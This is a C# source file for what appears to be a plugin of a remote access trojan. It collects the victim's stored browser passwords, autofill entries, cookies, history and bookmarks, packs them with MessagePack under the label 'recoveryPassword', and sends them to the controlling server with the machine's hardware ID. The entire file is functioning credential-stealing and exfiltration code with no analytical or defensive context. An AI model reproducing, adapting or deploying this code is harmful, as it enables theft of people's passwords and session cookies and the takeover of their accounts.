using MessagePackLib.MessagePack;
using System;
using System.Text;

namespace Plugin
{
    public static class Packet
    {
        public static void Read()
        {
            try
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "recoveryPassword";
                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;

                StringBuilder pbuilder = new StringBuilder();
                Stealer.Browser.GetAllInfo(pbuilder, Stealer.InfoType.PASSWORDS);
                StringBuilder abuilder = new StringBuilder();
                Stealer.Browser.GetAllInfo(abuilder, Stealer.InfoType.AUTOFILLS);
                StringBuilder cbuilder = new StringBuilder();
                Stealer.Browser.GetAllInfo(cbuilder, Stealer.InfoType.COOKIES);
                StringBuilder hbuilder = new StringBuilder();
                Stealer.Browser.GetAllInfo(hbuilder, Stealer.InfoType.HISTORYS);
                StringBuilder bbuilder = new StringBuilder();
                Stealer.Browser.GetAllInfo(bbuilder, Stealer.InfoType.BOOKMARKS);

                msgpack.ForcePathObject("password").AsString = pbuilder.ToString();
                msgpack.ForcePathObject("autofill").AsString = abuilder.ToString();
                msgpack.ForcePathObject("cookie").AsString = cbuilder.ToString();
                msgpack.ForcePathObject("history").AsString = hbuilder.ToString();
                msgpack.ForcePathObject("bookmark").AsString = bbuilder.ToString();

                Connection.Send(msgpack.Encode2Bytes());
                Log(Connection.Hwid + ":recovery success.");
            }
            catch (Exception ex)
            {
                Error(ex.Message);
                Connection.Disconnected();
            }
        }

        public static void Error(string ex)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }
        public static void Log(string message)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Logs";
            msgpack.ForcePathObject("Message").AsString = message;
            Connection.Send(msgpack.Encode2Bytes());
        }
    }

}